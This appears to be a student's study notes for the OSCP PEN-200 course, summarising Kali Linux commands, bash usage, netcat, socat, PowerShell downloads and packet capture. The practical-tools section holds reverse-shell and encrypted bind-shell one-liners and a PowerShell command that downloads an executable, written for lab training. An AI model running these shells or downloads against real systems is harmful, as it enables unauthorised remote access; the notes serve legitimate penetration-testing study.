# OSCP-pen-200
resume of all the course

## 1-getting Comfortable with kali linux


To change the password : passwd

To know the user : whoami

To excute commande as root : sudo 

2-Linux fileSystem :

/bin/  => contain basic programmes

/sbin/  => contain system programmes

/etc/  => contain configuration file


/tmp/  => contain temparary file which be deleted when boot



3 -basic commande :

man +commande  =>  to show the documentation of the commande 

man -k 'command or regular expression'  / apropos 'commande or regular '  =>  to search a commande

ls -a  =>  show all file include hidden

cd  => to go to directory

cd ~  =>  to go to home directory

pwd  =>  to show the directory

mkdir name_directory  =>  to create directory 

rm -rf name_directory  =>  to delete directory

mkdir -p {a,b,c,d}  =>  to create multiple directory



4 - finding files on kali linux :


which name  =>  search in bin sbin directories.

locate name   =>  search in database locate.db

find / -name name  =>  for recursive searche of file 



5-services in linux :

systemctl list-unit-files  =>  to show the status of all services

sudo systemctl start ssh   =>  to start the ssh service

sudo systemctl enable ssh  => to start automaticaly when boot time

sudo systemctl start apache2   =>  to start the http service



6-update and upgrade :

sudo apt update  =>  to update apt database of version of your packages



sudo apt install package

sudo apt upgrade package  =>  to upgrade the package

sudo apt remove --purge package

apt-cache search neme # to serach if the name package  is installed 


sudo dpkg -i ./package.deb   => to install package from file.deb
 
 ## commande line fun :
 2-commande line fun :
environment variable:
env => to show all the variables

echo $name_var => to show the containte of the variable

name_var = "data"  => to implement variable localy

export name_var="data"  => to implement variable and show it from other bash

history => to show history of commande entered

!commande_number => to excute the commande number

!! => to excuter the final commande



tail -n 3 .bash_history => to give 3 final commande in bash history

ctrl + r  => to search for commande the enter to excute 

##practical tools :

netcat => tools for read and write in network connection using tcp/udp protocols

for simple chat :

nc -nlvp port_number => to open the port

nc -nv ip port_number => to connect with him

for transfert file :

nc -nlvp port_number > name_destination => for the receiver

nc -nv ip port < file  => for the sender

remote administration with netcut :

reverse shell :

nc -nvlp 4444 -e /bin/bash => target

nc -nv ip port  => attacker



socat => like netcut 
chat app:

socat - TCP4:127.0.0.1:4488

socat TCP4-LISTEN:4444 STDOUT

send files :

sudo socat TCP4-LISTEN:443,fork file:ping.txt

sudo socat TCP4-LISTEN:443,fork file:ping.txt

reverse shell :

socat TCP4:127.0.0.1:442 EXEC:/bin/bash

sudo socat -d -d TCP4-LISTEN:442 STDOUT



secure reverse shell:

openssl req -newkey rsa:2848 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt => generate private key and certificates

cat bind_shell.key bind_shell.crt > bind_shell.pem => for one file

sudo socat OPENSSL-LISTEN:441,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash

socat - OPENSSL:127.0.0.1:441,verify=0



powerShell : in windows is programming language and commandes

powershett -c "(new-object System.Net.WebCtient).DowntoadFite('http:/

/18.11.8.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')" => to downlaod files

powercat : is netcat of powerShell



Powercat Stand-Alone Payloads :


paylaod is set of powershell commande encoded .
 


wireshark :

sudo wireshark 

filter :

net 192.168.43.0/24 => to filter for network range

tcp.port == 80 => to specify tcp port

we can display the stream of session : write click the follow then tcp stream

tcpdump:

tcpdump -r  file.pcap => reading file packet 

sudo tcpdump -nX -r password_cracking_filtered.pcap => to show data 

sudo tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap => to apply filter



sudo tcpdump -A -n 'tcp[13] = 24' -r password_cracking_filtered.pcap => display only the data packet




redirection : STDIN, STDOUT, and STDERR are defined as 0, 1, and 2 respectively. can be addet before the > .for the condition

echo "hello world" > h.txt  => create the file with the text or replace if exsist

cat h.txt  => show the file

echo "new line" >> h.txt  => add the line to the file

piping :

commande 1| comande 2  =>  apply comannde 2 to result of commande 1



grep text => show all line contain text 

grep -v text => show all line not contain text

echo "i am aziz" | sed 's/aziz/abdelaaziz/'  => to remplace aziz with abdelaaziz and in general to edit 

cut -d ":" -f 1 /etc/passwd => to show text before : for each line or cutting


echo "hello::world::iamaziz" | awk -F "::" '{print $1,$3}' => awk same with cut with multiple digit seperator

wc -l file.txt => number of line

sort -u => eliminate double

uniq -c => add the number of occurence




editing files :

nano 


vi

comparing files :

comm file1 file2 => must be sorted

diff -c file1 file2 => like comm

vimdiff file1 file2 => open vi and show the two files

managing process :

background process or excute in background : add & to the end of commande

job control :

jobs => give jobs running in the current terminal

fg %jobNumber => to return job to foreground

process control :

ps -ef => to show all process

ps -FC leafpad => to show specific process

kill process id => to delete and stop process

file and commande monitoring :

sudo tail -f /var/log/apache2/access.log => to show on real time change in file

watch -n 10 -d commande => to run commande every 10 seconds


downlaoding files :

wget  => to downlaod files

curl => to downlaod or uplaod

axel => for downlaod with multiple conneection


costimazing the bash environment :

alias lsa="ls -la" => to define a commande







